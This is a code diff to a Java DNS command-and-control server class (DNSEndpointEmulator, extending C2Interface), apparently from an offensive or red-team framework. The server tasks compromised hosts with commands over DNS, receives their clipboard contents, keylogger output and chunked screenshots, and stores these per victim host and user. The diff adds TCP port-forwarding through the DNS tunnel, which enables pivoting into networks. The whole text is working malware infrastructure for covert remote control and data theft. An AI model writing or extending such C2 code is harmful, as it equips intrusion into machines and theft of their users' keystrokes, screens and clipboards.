@@ -79,14 +79,14 @@ public class DNSEndpointEmulator extends C2Interface {
 		try {
 			byte[] buf = new byte[2000000];
 			DatagramSocket socket = new DatagramSocket(port);
-			socket.setSoTimeout(50);
+			socket.setSoTimeout(500);
 			System.out.println("DNS online: " + port);
 			while (running) {
 				try {
 					Arrays.fill(buf, (byte) 0);
 					DatagramPacket packet = new DatagramPacket(buf, buf.length);
 					socket.receive(packet);
-
+					
 					String data = new String(packet.getData(), 12, packet.getLength() - 12);
 					if (Constants.DEBUG) {
 						System.out.println("DEBUG: UDP received raw: " + data);
@@ -121,57 +121,69 @@ public class DNSEndpointEmulator extends C2Interface {
 							sessionId = io.addSession(username, hostname, protocol);
 						}
 
-						String nextCommand = io.pollCommand(sessionId);
-						if (Constants.DEBUG) {
-							System.out.println("DEBUG: UDP polling for command for: " + sessionId + ": " + nextCommand);
-						}
-						if (nextCommand != null) {
-							response = nextCommand;
-						} else {
-							response = "<control> No Command";
-						}
-						// System.out.println("Arg: -" + args[4] + "- on session id " + sessionId );
-						if (args[4].startsWith("<harvest>")) {
-							String baseDir = properties.getProperty(Constants.DAEMONLZHARVEST) + File.separator
-									+ hostname + pid + username;
-							Files.createDirectories(Paths.get(baseDir));
-							String file = "";
-							if (args[4].contains("<Clipboard>")) {
-								// filename = "Clipboard" + HTTPSManager.ISO8601_WIN.format(new Date()) +
-								// ".txt";
-								file = args[4].substring("<harvest><Clipboard>".length());
-								harvester.processHarvest("Clipboard", hostname, pid, username, file);
+						if (args[4].startsWith("<portForward>")) {
+							String[] pfRequest = args[4].substring("<portForward>".length()).split("<pf>");
+							if (pfRequest.length != 2) {
+								response = "Invalid request";
 							} else {
-								// TODO: Implement DNS generic harvest reception
+								try {
+									if (!pfRequest[1].equals("<REQUEST_DATA>")) {
+										io.queueForwardedTCPTraffic(sessionId, pfRequest[0], pfRequest[1]);
+									}
+									//System.out.println("Request Data: " + pfRequest[0] + " at " + sessionId);
+									String nextData = io.grabForwardedTCPTraffic(sessionId, pfRequest[0]);
+									if (nextData != null) {
+										response = nextData;
+									} else {
+										response = Constants.PORT_FORWARD_NO_DATA;
+									}
+								} catch (IllegalArgumentException ex) {
+									response = "Invalid request";
+								}
 							}
-
+						} else {
+							String nextCommand = io.pollCommand(sessionId);
 							if (Constants.DEBUG) {
-								System.out.println("DEBUG: UDP harvest payload: " + file);
+								System.out.println(
+										"DEBUG: UDP polling for command for: " + sessionId + ": " + nextCommand);
 							}
-							/*
-							 * try (FileWriter stream = new FileWriter(baseDir + File.separator + filename))
-							 * { stream.write(file.toString()); }
-							 */
-						} else if (args[4].startsWith("<keylogger>")) {
-							keylogger.writeEntry(hostname, args[4].substring("<keylogger>".length()));
-							// FileWriter fw = new
-							// FileWriter(properties.getProperty(Constants.DAEMONLZLOGGER) + File.separator
-							// + hostname, true);
-							// fw.write(args[4].substring("<keylogger>".length()));
-							// fw.close();
-						} else if (args[4].startsWith("<screenshot>") && !args[4].contains("<final>")) {
-							String b64 = args[4].substring("<screenshot>".length());
-							screenshotBuffer = screenshotBuffer + b64;
-							// If we tell the client a normal "no command", it will be queued.
-							// Give special discard statement that can be ignored.
-							response = "<discard>";
-						} else if (args[4].startsWith("<screenshot>") && args[4].contains("<final>")) {
-							String b64 = args[4].substring("<screenshot><final>".length());
-							ScreenshotHelper.saveScreenshot(screenshotBuffer + b64, hostname, username,
-									properties.getProperty(Constants.DAEMONLZHARVEST));
-							screenshotBuffer = "";
-						} else if (!args[4].contentEquals("<poll>")) {
-							io.sendIO(sessionId, args[4]);
+							if (nextCommand != null) {
+								response = nextCommand;
+							} else {
+								response = "<control> No Command";
+							}
+							// System.out.println("Arg: -" + args[4] + "- on session id " + sessionId );
+							if (args[4].startsWith("<harvest>")) {
+								String baseDir = properties.getProperty(Constants.DAEMONLZHARVEST) + File.separator
+										+ hostname + pid + username;
+								Files.createDirectories(Paths.get(baseDir));
+								String file = "";
+								if (args[4].contains("<Clipboard>")) {
+									file = args[4].substring("<harvest><Clipboard>".length());
+									harvester.processHarvest("Clipboard", hostname, pid, username, file);
+								} else {
+									// TODO: Implement DNS generic harvest reception
+								}
+
+								if (Constants.DEBUG) {
+									System.out.println("DEBUG: UDP harvest payload: " + file);
+								}
+							} else if (args[4].startsWith("<keylogger>")) {
+								keylogger.writeEntry(hostname, args[4].substring("<keylogger>".length()));
+							} else if (args[4].startsWith("<screenshot>") && !args[4].contains("<final>")) {
+								String b64 = args[4].substring("<screenshot>".length());
+								screenshotBuffer = screenshotBuffer + b64;
+								// If we tell the client a normal "no command", it will be queued.
+								// Give special discard statement that can be ignored.
+								response = "<discard>";
+							} else if (args[4].startsWith("<screenshot>") && args[4].contains("<final>")) {
+								String b64 = args[4].substring("<screenshot><final>".length());
+								ScreenshotHelper.saveScreenshot(screenshotBuffer + b64, hostname, username,
+										properties.getProperty(Constants.DAEMONLZHARVEST));
+								screenshotBuffer = "";
+							} else if (!args[4].contentEquals("<poll>")) {
+								io.sendIO(sessionId, args[4]);
+							}
 						}
 					}
 
